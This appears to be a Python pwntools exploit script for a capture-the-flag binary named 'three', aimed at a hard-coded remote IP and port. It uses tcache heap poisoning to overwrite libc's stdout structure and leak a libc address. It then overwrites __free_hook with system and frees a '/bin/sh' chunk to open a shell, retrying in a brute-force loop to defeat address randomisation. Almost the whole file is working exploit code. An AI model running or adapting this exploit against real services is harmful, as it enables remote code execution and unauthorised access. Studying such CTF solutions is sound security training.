from pwn import *

# is_local = True
is_local = False

binary_path = "./three"

libc_file_path = ""
#libc_file_path = "./libc.so.6"

ip, port = "39.96.13.122", 9999

show_info_sign = True

def show_debug_info(flag = True):
	global show_info_sign

	if flag == True:
		#context.log_level = 'DEBUG'
		show_info_sign = True
	else:
		#context.log_level = 'info'
		show_info_sign = False

if is_local:
	# ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
	show_debug_info(True)
	target = binary_path
else:
	show_debug_info(False)
	target = (ip, port)

def d2v_x64(data):
	return u64(data[:8].ljust(8, '\x00'))

def d2v_x32(data):
	return u32(data[:4].ljust(4, '\x00'))

def expect_data(io_or_data, b_str = None, e_str = None):
	if type(io_or_data) != str:
		t_io = io_or_data

		if b_str != None and b_str != "":
			recvuntil(t_io, b_str)
		data = recvuntil(t_io, e_str)[:-len(e_str)]
	else:
		if b_str == None or b_str == "":
			b_pos = 0
		else:
			t_data = io_or_data
			b_pos = t_data.find(b_str)
			if b_pos == -1:
				return ""
			b_pos += len(b_str)

		if e_str == None or e_str == "":
			data = t_data[b_pos:]
		else:
			e_pos = t_data.find(e_str, b_pos)
			if e_pos == -1:
				return ""
			data = t_data[b_pos:e_pos]
	return data

import sys

def show_echo(data):
	global show_info_sign
	if show_info_sign:
		sys.stdout.write(data)

def recv(io, size):
	data = io.recv(size)
	show_echo(data)
	return data

def recvuntil(io, info):
	data = io.recvuntil(info)
	show_echo(data)
	return data

def send(io, data):
	io.send(data)
	show_echo(data)

def sendline(io, data):
	send(io, data + "\n")

def rd_wr_str(io, info, buff):
	#io.recvuntil(info, timeout = 2)
	#io.send(buff)
	data = recvuntil(io, info)
	send(io, buff)
	return data

def rd_wr_int(io, info, val):
	return rd_wr_str(io, info, str(val) + "\n")
	
def r_w(io, info, data):
	if type(data) == int:
		return rd_wr_int(io, info, data)
	else:
		return rd_wr_str(io, info, data)

def set_context():
	binary_elf = ELF(binary_path)
	context(arch = binary_elf.arch, os = 'linux', endian = binary_elf.endian)

import commands
def do_command(cmd_line):
	(status, output) = commands.getstatusoutput(cmd_line)
	return output

global_pid_int = -1
def gdb_attach(io, break_list = [], is_pie = False, code_base = 0):
	global global_pid_int
	if is_local:
		set_pid(io)
		if is_pie == True:
			if code_base == 0:
				set_pid(io)
				data = do_command("cat /proc/%d/maps"%global_pid_int)
				code_base = int(data.split("\n")[0].split("-")[0], 16)
		gdbscript = ""
		for item in break_list:
			gdbscript += "b *0x%x\n"%(item + code_base)
		if gdbscript != "":
			gdbscript += "c\n"
		
		gdb.attach(global_pid_int, gdbscript = gdbscript)

def set_pid(io):
	global global_pid_int
	if global_pid_int == -1:
		if is_local:
			"""
			data = do_command("ps -aux | grep -E '%s$'"%(binary_path.replace("./", ""))).strip().split("\n")[-1]
			#print "-"*0x10
			#print repr(data)
			items = data.split(" ")[1:]
			global_pid_int = 0
			i = 0
			while len(items[i]) == 0:
				i += 1
			global_pid_int = int(items[i])
			#"""
			global_pid_int = pidof(io)[0]
		
def gdb_hint(io, info = ""):
	if info != "":
		print info
	if is_local:
		set_pid(io)
		raw_input("----attach pidof '%d', press enter to continue......----"%global_pid_int)

	if info != "":
		print "pass", info
		
def get_io(target):
	if type(target) == str:
		io = process(target, display = True, aslr = None, env = {"LD_PRELOAD":libc_file_path})
		#io = process(target, shell = True, display = True, aslr = None, env = {"LD_PRELOAD":libc_file_path})
	else:
		io = remote(target[0], target[1])
	return io
	
def r_w(io, info, data):
	if type(data) == int:
		rd_wr_int(io, info, data)
	else:
		rd_wr_str(io, info, data)
	
def m_c(io, choice, prompt = "choice:"):
	r_w(io, prompt, choice)

def s_i(io, choice, prompt = [":"]):
	r_w(io, prompt, choice)

def add(io, data):
	m_c(io, 1)
	s_i(io, data)

def edit(io, idx, data):
	m_c(io, 2)
	s_i(io, idx)
	s_i(io, data)

def delete(io, idx, clear = "n\n"):
	m_c(io, 3)
	s_i(io, idx)
	s_i(io, clear)

def show(io, idx):
	m_c(io, 4)
	s_i(io, idx)


def read_file(filename, mode = "rb"):
	file_r = open(filename, mode)
	data = file_r.read()
	file_r.close()
	return data

def get_pie_addr():
	pid = int(do_command("pidof %s"%binary_path).strip().split(" ")[0])

	info = read_file("/proc/%d/maps"%pid)

	libc_base = 0
	proc_base = 0
	heap_base = 0
	for line in info.split("\n"):
		items = line.strip().replace("\t", " ").split(" ")
		#print items
		if libc_base == 0 and "libc" in items[-1] and ".so" in items[-1]:
			libc_base = int(items[0].split("-")[0], 16)
		elif heap_base == 0 and "[heap]" in items[-1]:
			print items[-1]
			heap_base = int(items[0].split("-")[0], 16)
		elif proc_base == 0 and items[-1].endswith(binary_path.replace("./", "")):
			proc_base = int(items[0].split("-")[0], 16)

	#print "proc_base:", hex(proc_base)
	#print "libc_base:", hex(libc_base)
	#print "heap_base:", hex(heap_base)

	return libc_base, proc_base, heap_base

def pwn(io):

	#offset info
	if is_local:
		#local
		offset_system = 0x0
		offset_binsh = 0x0
	else:
		#remote	
		offset_system = 0x0
		offset_binsh = 0x0
	
	show_debug_info(False)
	add(io, "0\n")
	add(io, "1\n")
	
	delete(io, 0, "y")
	delete(io, 1, "n")

	#libc_base, proc_base, heap_base = get_pie_addr()

	#print "libc_base:", hex(libc_base&0xffffff)
	#print "heap_base:", hex(heap_base&0xffff)
	heap_base = 0x8000
	libc_base = 0xda7000

	edit(io, 1, p64(heap_base + 0x60)[:2])

	add(io, "0\n")
	add(io, p64(0) + p64(heap_base + 0x10)[:2]) #2
	delete(io, 0, "y\n")
	edit(io, 2, p64(0) + p64(heap_base + 0x10)[:2])
	
	add(io, p64(0) + p64(0x51))
	delete(io, 0, "y\n")
	delete(io, 1, "y\n")
	edit(io, 2, p64(0) + p64(heap_base + 0x20)[:2])
	add(io, p64(0)*7 + p64(0x201))
	delete(io, 0, "y\n")
	edit(io, 2, p64(0) + p64(heap_base + 0x60)[:2])
	#add(io, p64(0))
	#gdb_attach(io, [])
	malloc_hook = 0x3ebc30
	unsortbin = 0x3ebca0
	stdout_addr = 0x3ec760

	for i in range(8):
		delete(io, 2, "n\n")
	edit(io, 2, p64(0) + p64(stdout_addr + libc_base)[:2])
	payload = ""
	payload += p64(0x00000000fbad1800) + p64(0)*3 + p8(0)
	add(io, payload)
	#delete(io, 0, "n\n")
	#gdb_attach(io, [])
	recv(io, 8)
	data = recv(io, 8)
	print data
	libc_addr = d2v_x64(data)
	print "libc_addr:", hex(libc_addr)
	libc_base = libc_addr - 0x3ed8b0
	print "libc_base:", hex(libc_base)
	
	free_hook  = libc_base + 0x3ed8e8
	system_addr = libc_base + 0x4f440

	edit(io, 2, p64(0) + p64(free_hook - 8))
	#payload = p64(0)*7 + p64(free_hook - 8)
	#edit(io, 1, payload)
	#gdb_attach(io, [])
	add(io, "/bin/sh\x00" + p64(system_addr))

	#gdb_attach(io, [])
	m_c(io, 3)
	s_i(io, 1)
	io.interactive()
	exit(0)

while True:
	try:
		io = get_io(target)
		pwn(io)
	except Exception as e:
		io.close()
